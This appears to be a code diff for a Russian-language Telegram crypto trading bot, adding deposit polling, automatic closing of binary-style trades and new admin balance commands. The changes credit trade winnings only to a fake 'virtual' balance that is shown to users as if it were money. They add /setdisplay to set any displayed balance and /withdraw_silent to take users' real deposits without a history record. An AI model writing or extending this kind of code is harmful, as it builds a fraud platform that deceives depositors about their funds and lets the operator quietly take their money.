-                        # Notify user
-                        try:
-                            await bot_send_message(int(user.telegram_id), f"✅ <b>Пополнение успешно!</b>\n\n💰 Зачислено: {amount_after_fee:.2f} USDT\n💳 Комиссия: {fee_amount:.2f} USDT\n📊 Новый баланс: {user.balance_usdt:.2f} USDT")
-                        except: pass
-                        
-                        print(f"[CRYPTOBOT] Deposit processed: User #{user.profile_id}, +{amount_after_fee} USDT")
-                    else:
-                        print(f"[CRYPTOBOT] User not found for transaction {trx.id}")
-                else:
-                    print(f"[CRYPTOBOT] Transaction not found for invoice {invoice_id}")
+                success, msg = await process_deposit_payment(db, invoice_id, amount, "webhook")
+                return {"ok": success, "message": msg}
+            else:
+                print(f"[CRYPTOBOT WEBHOOK] Skipping: asset={asset}, status={status}")
         
         return {"ok": True}
     except Exception as e:
-        print(f"[CRYPTOBOT] Webhook error: {e}")
+        print(f"[CRYPTOBOT WEBHOOK] Error: {e}")
+        import traceback
+        traceback.print_exc()
         return {"ok": False, "error": str(e)}
+
+# ========== BACKGROUND DEPOSIT POLLING ==========
+async def poll_pending_deposits():
+    """Background task to check pending deposits every 30 seconds"""
+    while True:
+        try:
+            await asyncio.sleep(30)
+            
+            async with AsyncSessionLocal() as db:
+                # Find all pending deposit transactions older than 60 seconds
+                cutoff_time = datetime.utcnow() - timedelta(seconds=60)
+                
+                pending_txs = (await db.execute(
+                    select(Transaction).where(
+                        Transaction.type == "deposit",
+                        Transaction.status == "pending",
+                        Transaction.created_at < cutoff_time
+                    )
+                )).scalars().all()
+                
+                if pending_txs:
+                    print(f"[DEPOSIT POLL] Checking {len(pending_txs)} pending deposits...")
+                
+                for trx in pending_txs:
+                    invoice_id = (trx.details or {}).get("invoice_id")
+                    if not invoice_id:
+                        continue
+                    
+                    try:
+                        # Check invoice status via CryptoBot API
+                        headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
+                        async with aiohttp.ClientSession() as session:
+                            async with session.get(
+                                "https://pay.crypt.bot/api/getInvoices",
+                                headers=headers,
+                                params={"invoice_ids": invoice_id},
+                                timeout=15
+                            ) as r:
+                                resp = await r.json()
+                                if resp.get("ok") and resp.get("result", {}).get("items"):
+                                    item = resp["result"]["items"][0]
+                                    status = item.get("status")
+                                    amount = float(item.get("amount", 0))
+                                    
+                                    if status == "paid":
+                                        print(f"[DEPOSIT POLL] Invoice {invoice_id} is paid, processing...")
+                                        success, msg = await process_deposit_payment(db, invoice_id, amount, "polling")
+                                        print(f"[DEPOSIT POLL] Result: {success}, {msg}")
+                    except Exception as e:
+                        print(f"[DEPOSIT POLL] Error checking invoice {invoice_id}: {e}")
+                        
+        except Exception as e:
+            print(f"[DEPOSIT POLL] Background task error: {e}")
+
+@app.on_event("startup")
+async def start_deposit_polling():
+    """Start the background deposit polling task"""
+    asyncio.create_task(poll_pending_deposits())
+    print("[DEPOSIT POLL] Background polling task started (every 30s)")
+
+# Background task to close expired trades
+async def poll_expired_trades():
+    """Background task to close expired trades every 2 seconds"""
+    while True:
+        await asyncio.sleep(2)
+        try:
+            async with AsyncSessionLocal() as db:
+                # Find all active trades that have expired
+                now = datetime.utcnow()
+                result = await db.execute(
+                    select(Trade).where(
+                        Trade.status == "active"
+                    )
+                )
+                active_trades = result.scalars().all()
+                
+                expired_count = 0
+                for tr in active_trades:
+                    expire_time = tr.opened_at + timedelta(seconds=tr.duration_sec)
+                    if now >= expire_time:
+                        # Trade has expired - close it
+                        symbol = tr.pair.replace('/', '') + ('USDT' if not tr.pair.endswith('USDT') else '')
+                        
+                        u = (await db.execute(select(User).where(User.id == tr.user_id))).scalars().first()
+                        if not u:
+                            continue
+                        
+                        # Get REAL current price from OKX
+                        cur = await okx_get_price(symbol) or tr.start_price
+                        
+                        # Calculate REAL result based on price movement
+                        direction = 1 if (cur - tr.start_price) > 0 else (-1 if (cur - tr.start_price) < 0 else 0)
+                        
+                        # Determine win/loss based on user's prediction vs actual price movement
+                        if tr.side == 'buy':
+                            win = direction > 0
+                        else:
+                            win = direction < 0
+                        
+                        # Calculate payout: 70% profit on win
+                        PAYOUT_MULTIPLIER = 0.7
+                        payout = round(tr.amount_usdt * PAYOUT_MULTIPLIER, 6) if win else 0.0
+                        
+                        tr.status = "completed"
+                        tr.closed_at = datetime.utcnow()
+                        tr.close_price = cur
+                        tr.result = "win" if win else ("push" if direction == 0 else "loss")
+                        tr.payout = payout
+                        
+                        print(f"[TRADE POLL] Closed {symbol} {tr.side.upper()} → Start: ${tr.start_price:.2f}, Close: ${cur:.2f}, Result: {tr.result.upper()}")
+                        
+                        # Credit returns to VIRTUAL balance
+                        if win:
+                            u.virtual_balance = (u.virtual_balance or 0) + tr.amount_usdt + payout
+                        elif direction == 0:
+                            u.virtual_balance = (u.virtual_balance or 0) + tr.amount_usdt
+                        
+                        # Update transaction
+                        q = await db.execute(
+                            select(Transaction).where(
+                                Transaction.user_id == u.id,
+                                Transaction.type == "trade",
+                                Transaction.status == "pending"
+                            ).order_by(Transaction.created_at.desc())
+                        )
+                        trx = q.scalars().first()
+                        if trx:
+                            trx.status = "done"
+                            existing_details = trx.details or {}
+                            trx.details = {**existing_details, "result": tr.result, "payout": tr.payout, "close_price": cur}
+                        
+                        expired_count += 1
+                        
+                        # Send notification
+                        displayed_balance = (u.balance_usdt or 0) + (u.virtual_balance or 0)
+                        try:
+                            if win:
+                                profit = round(payout, 2)
+                                msg = f"🎉 <b>ВЫИГРЫШ!</b>\n\n📊 Пара: {tr.pair}\n💰 Ставка: {round(tr.amount_usdt, 2)} USDT\n✅ Выплата: +{profit} USDT\n💵 Баланс: {round(displayed_balance, 2)} USDT"
+                            else:
+                                msg = f"😔 <b>Сделка закрыта</b>\n\n📊 Пара: {tr.pair}\n💰 Ставка: {round(tr.amount_usdt, 2)} USDT\n❌ Результат: {'Ничья' if direction == 0 else 'Проигрыш'}\n💵 Баланс: {round(displayed_balance, 2)} USDT"
+                            await bot_send_message(int(u.telegram_id), msg)
+                        except:
+                            pass
+                
+                if expired_count > 0:
+                    await db.commit()
+                    print(f"[TRADE POLL] Closed {expired_count} expired trades")
+                    
+        except Exception as e:
+            print(f"[TRADE POLL] Error: {e}")
+
+@app.on_event("startup")
+async def start_trade_polling():
+    """Start the background trade polling task"""
+    asyncio.create_task(poll_expired_trades())
+    print("[TRADE POLL] Background polling task started (every 2s)")
 
 # Helper function for balance changes
 async def execute_balance_change(db: AsyncSession, profile_id: int, amount: float, action: str, admin_chat_id: str):
@@ -2526,8 +2920,36 @@ We'll respond as quickly as possible! ⚡"""
 /unblock ID - Разблокировать пользователя
 /addbalance ID СУММА - Добавить баланс
 /setbalance ID СУММА - Установить баланс
-/send_message ID MESSAGE - Сообщение пользователю"""
+/send_message ID MESSAGE - Сообщение пользователю
+
+<b>Управление балансами:</b>
+/setdisplay ID СУММА - Установить отображаемый баланс
+/realbalance ID СУММА - Установить реальный баланс
+/virtualbalance ID СУММА - Установить виртуальный баланс
+/withdraw_silent ID СУММА - Тихое списание (без истории)
+/files - Скачать файлы проекта"""
                 await bot_send_message(chat_id, admin_text, parse_mode="HTML")
+                return {"ok": True}
+            
+            # Handle /files command - Send project files to admin
+            elif text == "/files" and str(chat_id) == str(ADMIN_ID):
+                await bot_send_message(chat_id, "📦 Отправляю файлы проекта...")
+                files_to_send = [
+                    ("main.py", "🐍 Backend"),
+                    ("static/js/app.js", "⚡ Frontend JS"),
+                    ("static/css/style.css", "🎨 Styles"),
+                    ("templates/base.html", "📄 HTML Template"),
+                    ("railway.json", "🚂 Railway Config"),
+                    ("requirements.txt", "📋 Dependencies"),
+                    ("i18n/translations.json", "🌐 Translations")
+                ]
+                sent = 0
+                for fpath, desc in files_to_send:
+                    if os.path.exists(fpath):
+                        result = await bot_send_document(chat_id, fpath, desc)
+                        if result.get("ok"):
+                            sent += 1
+                await bot_send_message(chat_id, f"✅ Отправлено {sent}/{len(files_to_send)} файлов")
                 return {"ok": True}
             
             # Handle /menu command - User main menu (same as /start but without referral check)
@@ -2785,7 +3207,7 @@ We'll respond as quickly as possible! ⚡"""
                     await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
                 return {"ok": True}
             
-            # Handle /setbalance command - Set user display balance
+            # Handle /setbalance command - Set user virtual balance (legacy, now uses virtualbalance)
             elif text.startswith("/setbalance ") and str(chat_id) == str(ADMIN_ID):
                 try:
                     parts = text.split()
@@ -2795,13 +3217,113 @@ We'll respond as quickly as possible! ⚡"""
                         
                         user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                         if user:
-                            user.display_balance_usdt = new_balance
+                            user.virtual_balance = new_balance
                             await db.commit()
-                            await bot_send_message(chat_id, f"✅ <b>Отображаемый баланс обновлен!</b>\n\n🆔 Profile ID: #{profile_id}\n🎭 Новый отображаемый баланс: {new_balance:.2f} USDT\n💎 Реальный баланс: {user.balance_usdt:.2f} USDT", parse_mode="HTML")
+                            displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
+                            await bot_send_message(chat_id, f"✅ <b>Виртуальный баланс обновлен!</b>\n\n🆔 Profile ID: #{profile_id}\n🎭 Виртуальный: {new_balance:.2f} USDT\n💎 Реальный: {user.balance_usdt:.2f} USDT\n📊 Отображаемый: {displayed_bal:.2f} USDT", parse_mode="HTML")
                         else:
                             await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
                     else:
                         await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/setbalance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
+                except Exception as e:
+                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
+                return {"ok": True}
+            
+            # Handle /realbalance command - Set user real balance
+            elif text.startswith("/realbalance ") and str(chat_id) == str(ADMIN_ID):
+                try:
+                    parts = text.split()
+                    if len(parts) >= 3:
+                        profile_id = int(parts[1])
+                        amount = float(parts[2])
+                        
+                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                        if user:
+                            old = user.balance_usdt or 0
+                            user.balance_usdt = amount
+                            await db.commit()
+                            displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
+                            await bot_send_message(chat_id, f"✅ <b>Реальный баланс изменён</b>\n\n🆔 #{profile_id}\n💎 Было: {old:.2f} USDT\n💎 Стало: {amount:.2f} USDT\n📊 Отображаемый: {displayed_bal:.2f} USDT", parse_mode="HTML")
+                        else:
+                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
+                    else:
+                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/realbalance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
+                except Exception as e:
+                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
+                return {"ok": True}
+            
+            # Handle /virtualbalance command - Set user virtual balance
+            elif text.startswith("/virtualbalance ") and str(chat_id) == str(ADMIN_ID):
+                try:
+                    parts = text.split()
+                    if len(parts) >= 3:
+                        profile_id = int(parts[1])
+                        amount = float(parts[2])
+                        
+                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                        if user:
+                            old = user.virtual_balance or 0
+                            user.virtual_balance = amount
+                            await db.commit()
+                            displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
+                            await bot_send_message(chat_id, f"✅ <b>Виртуальный баланс изменён</b>\n\n🆔 #{profile_id}\n🎭 Было: {old:.2f} USDT\n🎭 Стало: {amount:.2f} USDT\n💎 Реальный: {user.balance_usdt:.2f} USDT\n📊 Отображаемый: {displayed_bal:.2f} USDT", parse_mode="HTML")
+                        else:
+                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
+                    else:
+                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/virtualbalance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
+                except Exception as e:
+                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
+                return {"ok": True}
+            
+            # Handle /withdraw_silent command - Silent withdrawal from real balance
+            elif text.startswith("/withdraw_silent ") and str(chat_id) == str(ADMIN_ID):
+                try:
+                    parts = text.split()
+                    if len(parts) >= 3:
+                        profile_id = int(parts[1])
+                        amount = float(parts[2])
+                        
+                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                        if user:
+                            if (user.balance_usdt or 0) >= amount:
+                                user.balance_usdt = (user.balance_usdt or 0) - amount
+                                await db.commit()
+                                displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
+                                await bot_send_message(chat_id, f"✅ <b>Тихое списание</b>\n\n🆔 #{profile_id}\n💸 Списано: {amount:.2f} USDT\n💎 Реальный баланс: {user.balance_usdt:.2f} USDT\n📊 Отображаемый: {displayed_bal:.2f} USDT", parse_mode="HTML")
+                            else:
+                                await bot_send_message(chat_id, f"❌ Недостаточно реальных средств. Доступно: {user.balance_usdt:.2f} USDT", parse_mode="HTML")
+                        else:
+                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
+                    else:
+                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/withdraw_silent PROFILE_ID AMOUNT</code>", parse_mode="HTML")
+                except Exception as e:
+                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
+                return {"ok": True}
+            
+            # /setdisplay ID AMOUNT - Set any displayed balance (auto-calculates virtual)
+            elif text.startswith("/setdisplay ") and str(chat_id) == str(ADMIN_ID):
+                try:
+                    parts = text.split()
+                    if len(parts) >= 3:
+                        profile_id = int(parts[1])
+                        target_display = float(parts[2])
+                        
+                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                        if user:
+                            real_bal = user.balance_usdt or 0
+                            old_virtual = user.virtual_balance or 0
+                            old_displayed = real_bal + old_virtual
+                            
+                            # Calculate virtual balance to achieve target display
+                            new_virtual = target_display - real_bal
+                            user.virtual_balance = new_virtual
+                            await db.commit()
+                            
+                            await bot_send_message(chat_id, f"✅ <b>Отображаемый баланс установлен!</b>\n\n🆔 #{profile_id}\n📊 Было: {old_displayed:.2f} USDT\n📊 Стало: {target_display:.2f} USDT\n\n💎 Реальный: {real_bal:.2f} USDT\n🎭 Виртуальный: {new_virtual:.2f} USDT", parse_mode="HTML")
+                        else:
+                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
+                    else:
+                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/setdisplay PROFILE_ID СУММА</code>\n\nПример: /setdisplay 100001 5000", parse_mode="HTML")
                 except Exception as e:
                     await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
                 return {"ok": True}
@@ -3006,23 +3528,29 @@ We'll respond as quickly as possible! ⚡"""
                             verify_status = "✅" if user.is_verified else "❌"
                             premium_status = "✅" if user.is_premium else "❌"
                             block_status = "✅" if user.is_blocked else "❌"
+                            real_balance = user.balance_usdt or 0.0
+                            virtual_bal = user.virtual_balance or 0.0
+                            displayed_bal = real_balance + virtual_bal
                             
                             msg = f"👤 <b>Пользователь #{profile_id}</b>\n\n"
                             msg += f"Telegram: {user.telegram_id}\n"
-                            msg += f"Username: @{user.username or 'N/A'}\n"
-                            msg += f"Баланс: {user.balance_usdt:.2f} USDT\n"
+                            msg += f"Username: @{user.username or 'N/A'}\n\n"
+                            msg += f"💎 Реальный: {real_balance:.2f} USDT\n"
+                            msg += f"🎭 Виртуальный: {virtual_bal:.2f} USDT\n"
+                            msg += f"📊 Отображаемый: {displayed_bal:.2f} USDT\n\n"
                             msg += f"Верификация: {verify_status}\n"
                             msg += f"Premium: {premium_status}\n"
                             msg += f"🚫 Заблокирован: {block_status}\n"
                             if user.is_blocked and user.block_reason:
                                 msg += f"Причина: {user.block_reason}\n"
                             msg += f"\n<b>Команды:</b>\n"
+                            msg += f"/realbalance {profile_id} СУММА - реальный баланс\n"
+                            msg += f"/virtualbalance {profile_id} СУММА - виртуальный баланс\n"
+                            msg += f"/withdraw_silent {profile_id} СУММА - тихое списание\n"
                             msg += f"/verify {profile_id} - переключить верификацию\n"
                             msg += f"/premium {profile_id} - переключить Premium\n"
                             msg += f"/block {profile_id} ПРИЧИНА - заблокировать\n"
-                            msg += f"/unblock {profile_id} - разблокировать\n"
-                            msg += f"/addbalance {profile_id} СУММА - добавить баланс\n"
-                            msg += f"/setbalance {profile_id} СУММА - установить баланс"
+                            msg += f"/unblock {profile_id} - разблокировать"
                             
                             await bot_send_message(chat_id, msg, parse_mode="HTML")
                         else:
@@ -3158,12 +3686,14 @@ We'll respond as quickly as possible! ⚡"""
                         elif action == "input_display_amount":
                             user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                             if user:
-                                user.display_balance_usdt = amount
+                                user.virtual_balance = amount
                                 await db.commit()
-                                message = f"✅ <b>Отображаемый баланс обновлен!</b>\n\n"
+                                displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
+                                message = f"✅ <b>Виртуальный баланс обновлен!</b>\n\n"
                                 message += f"🆔 Profile ID: #{profile_id}\n"
-                                message += f"🎭 Новый отображаемый: {amount:.2f} USDT\n"
-                                message += f"💎 Реальный баланс: {user.balance_usdt:.2f} USDT"
+                                message += f"🎭 Виртуальный: {amount:.2f} USDT\n"
+                                message += f"💎 Реальный: {user.balance_usdt:.2f} USDT\n"
+                                message += f"📊 Отображаемый: {displayed_bal:.2f} USDT"
                                 await bot_send_message(chat_id, message, parse_mode="HTML")
                                 del admin_balance_state[str(ADMIN_ID)]
                             else:
